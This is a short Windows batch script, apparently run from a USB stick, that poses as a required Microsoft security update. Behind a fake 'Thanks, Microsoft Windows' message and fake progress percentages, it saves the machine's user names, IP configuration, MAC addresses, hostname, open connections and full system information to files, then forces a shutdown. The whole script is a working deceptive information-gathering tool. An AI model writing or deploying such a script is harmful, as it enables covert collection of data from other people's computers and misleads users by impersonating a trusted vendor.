@echo off

::Prompt user for Windows update.
msg %username% /W "A new Windows update is availible. It is required to download it. It only takes a couple of minutes, 
but after this your computer is safe. It will fix all known problems, vulnerabilities etc. Thanks, Microsoft Windows.
The download will automatically start after 15 seconds."

::Wait user to read the message.
timeout /t 15 /nobreak

::Change the color.
color 0e

::Get all usernames from computer.
DIR C:\Users> usernames.txt

::Get private IP.
echo 0%% Updating your system...
IPCONFIG /all > myIP.txt

::Get the MAC addresses.
echo 10%% It will take about few minutes, please be patient...
GETMAC > mac.txt
echo 20%% is done, please wait...
echo 30%% is done, please wait...
echo 40%% is done, please wait...

::Be sure the hostname was got.
echo 50%% is done, please wait...
echo 60%% is done, please wait...
HOSTNAME > hostnames.txt

::Get open ports.
echo 70%% is done, please wait...
NETSTAT > ports.txt

::Get computer specs.
echo 80%% Almost done...
echo 90%% Last step, it may take up to 1 minute...
msinfo32 /nfo info.nfo
echo 100%% Finished, Thank you for using Microsoft Windows!
echo Done, this window will close automatically.

::Poweroff the computer (to unmount your USB).
%windir%\System32\shutdown.exe -s -t 05

::End.
